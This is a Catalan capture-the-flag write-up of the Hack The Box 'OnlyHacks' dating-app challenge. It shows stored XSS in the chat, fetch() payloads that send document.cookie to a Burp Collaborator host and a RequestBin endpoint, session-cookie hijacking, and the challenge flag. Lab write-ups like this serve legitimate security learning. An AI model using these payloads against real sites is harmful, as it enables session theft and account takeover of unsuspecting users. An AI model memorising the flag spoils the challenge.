Al llarg del challenge hi ha varis canvis d'usuari (sempre amb la mateixa foto de perfil) i diferents inicis de sessió ja que l'he fet en més d'un dia.

Aquest challenge no té fitxers per ser descarregats, simplement ens hem de connectar al challenge i veure la aplicació web que se'ns mostra. Sembla que ens trobem davant una aplicació de cites rollo Tinder al clicar per fer-nos un compte:

![image](https://github.com/user-attachments/assets/f862413c-08de-47cc-8cad-0f1e17cfa69d)


![image](https://github.com/user-attachments/assets/969aa58f-2213-4dab-9b57-46bb2717736b)


Es confirma al fer-nos el compte que és una aplicació de cites. Li posaré like a totes les noies per veure com va la aplicació web:

![image](https://github.com/user-attachments/assets/c547a843-44c3-4720-9e0d-2c8c20b97727)


Un cop acabada la gent de la app a la qual podem posar like o descartar, anem a dalt a la dreta a la pestnaya Matches i veiem que hem fet match amb la Renata i que podem parlar amb ella:

![image](https://github.com/user-attachments/assets/716f07a0-a183-4620-8839-d5d0487ac468)


Ara que tenim accés al xat, provarem un atac XSS utilitzant els elements habituals del llenguatge JavaScript per fer càrregues útils malicioses, per exemple provem això trobat a la pàgina web següent https://www.invicti.com/learn/cross-site-scripting-xss/ on hi ha un llistat amb vàris atacs XSS a provar:

- `<script> alert("XSS");</script>`

I ha funcionat!!

![image](https://github.com/user-attachments/assets/6962215b-5763-457d-a55d-473efbe35f49)


Ara, el que sembla que haurem de fer és robar la seva cookie ja que si llegim la descripció del challenge traduïda al català posa "Les cites i les relacions poden ser emocionants, especialment durant Sant Valentí, però és important estar atent als impostors. Pots ajudar a identificar possibles fraus?" cosa que si robem la seva cookie de sessió ens permetria fer-nos passar per ella, i,  com és lògic en una aplicació web, hi ha una cookie com la nostra propia que ens manté connectats a l'aplicació:

![image](https://github.com/user-attachments/assets/be478d70-d6db-410e-a016-1063cfdd601e)


Després d'investigar força, veig gràcies a aquesta pàgina https://medium.com/@marduk.i.am/exploiting-cross-site-scripting-to-steal-cookies-3d14c8b42fae que posant a la consola del navegador el següent codi Javascript ``document.cookie`` puc obtenir la cookie de sessió, la meva, però almenys ja sé on haig de buscar:

![image](https://github.com/user-attachments/assets/14c8e1ce-ccb6-4114-8b03-1279bd561055)


He trobat aquest repo de GitHub: https://github.com/botesjuan/Burp-Suite-Certified-Practitioner-Exam-Study/blob/main/payloads/CookieStealer-Payloads.md  que ens serà molt útil per intentar aconseguir la cookie de sessió de la Renata. El primer que faig és provar el primer que hi ha amb Burpsuite: 

```
<script>
fetch(`https://burpcollaborator.net`, {method: ‘POST’,mode: ‘no-cors’,body:document.cookie});
</script>
```

Ho enviem amb el mètode post, per tant hem de veure la petició amb el mètode post a veure si ens retorna la seva cookie però no ha funcionat. I no ens funciona perquè no estem a la mateixa xarxa que aquesta aplicació web que està oberta a tot internet, i al no estar a la mateixa xarxa connectats per VPN per exemple, doncs no és tant senzill com obrir un port amb netcat i rebre el resultat de la petició, és a dir la cookie de sessió.

Veig per internet que hi ha gent que utilitza RequestBin: https://requestbin.whapi.cloud/ per fer això, ja que és **una de les formes més fàcils i ràpides** de capturar peticions com les que farem. Anem a la pàgina i cliquem a Create a RequestBin::

![image](https://github.com/user-attachments/assets/6c395647-568d-46a7-915e-8caf72a8f91b)


I això el que fa és donar-nos un endpoint:

![image](https://github.com/user-attachments/assets/93d62bc6-3c86-4a6a-8be2-669fee096e02)



És el que veiem a l'exemple de petició curl: 

```
┌──(kali㉿kali)-[~]
└─$ curl -X POST -d "fizz=buzz" http://requestbin.whapi.cloud/1gt3rv21
ok
````

Ara adaptant aquest payload XSS amb l'endpoint que hem obtingut hauríem de poder robar la cookie de sessió:

```
`<script>
fetch(`http://requestbin.whapi.cloud/y4kuv3y4`, {method: ‘POST’,mode: ‘no-cors’,body:document.cookie});
</script>`
```

Com que no ha funcionat, provarem un altre payload:

```
`<script>
fetch(`http://requestbin.whapi.cloud/y4kuv3y4/x`+document.cookie);
</script>`
```

I ara sí que ha funcionat, amb el segon de la llista del repo que hem trobat. Veiem com jo tinc una cookie de sessió: 

![image](https://github.com/user-attachments/assets/88f910c9-c83c-4887-a074-af76ed09f1b9)


``session:"eyJ1c2VyIjp7ImlkIjo1LCJ1c2VybmFtZSI6InBvbGlQb2wifX0.Z_LUFQ.HpFWSP0XNHIldUZEKR4Lb6dXVL4"``

Les cookies estan en  JWT amb base64.

I, al enviar aquest atac XSS per el chat hem obtingut la cookie de sessió de la Renata, a la imatge tenim la seva cookie de sessió primer, i la segona és la nostra. Sabem que és la de la Renata perquè  la víctima estava accedint **a una app local en port 5000** ja que veiem que està en localhost(127.0.0.1), per exemple amb Flask (del qual tinc una api d'autenticació que genera tokens molt similars) o una app de desenvolupament en un entorn local i també veiem l’IP pública (via Cloudflare) de la víctima real que és diferent a la meva i que és la que ens dona HTB. 

![image](https://github.com/user-attachments/assets/bd8027f2-58d9-47c8-80fa-4407b4148dbe)


En resum, hem injectat **un payload XSS** en una aplicació que corria localment per la víctima (`127.0.0.1:5000`). El navegador de la víctima ha executat el codi JS i ha enviat la **cookie de sessió** al nostre **requestbin** on l'hem rebut **amb èxit** i ara fem un **session hijack** si el servidor no utilitza **HttpOnly** a la cookie, que veiem que no:

![image](https://github.com/user-attachments/assets/31e55be7-059b-4d4d-b72e-f00a69b00e74)


Ara, haurem de canviar la nostra cookie de sessió per la seva per "robar" el seu usuari. oh he hagut de fer amb el Google Chrome ja que amb el Mozilla Firefox no me'n sortia a la hora de canviar la cookie 🤣​:

![image](https://github.com/user-attachments/assets/d29bd1ae-e278-4916-8361-6c963aca73cf)


Un cop fet això, estem a la sessió de la Renata, i veiem que a part de parlar amb nosaltres (l'usuari poliPol) amb la foto de perfil d'en Charles Leclerc a Japó 2025 parla amb un altre usuari de l'aplicació anomenat Dimitris, qui, en el seu xat té la flag del challenge!!!

![image](https://github.com/user-attachments/assets/e2d662ca-d6d3-4893-8397-0a07af17413c)
]

HTB{d0nt_trust_str4ng3r5_bl1ndly}

Per tant, ara ja la podem copiar a HTB i completar el challenge OnlyHacks (per cert, bon missatge de la flag de no creures a estranys cegament o a cegues 🤣):

![image](https://github.com/user-attachments/assets/f3cd409e-1f5f-479b-bc86-b5559235fec7)



He fet aquest challenge arrel de veure el video d'en s4vitar fent-lo.
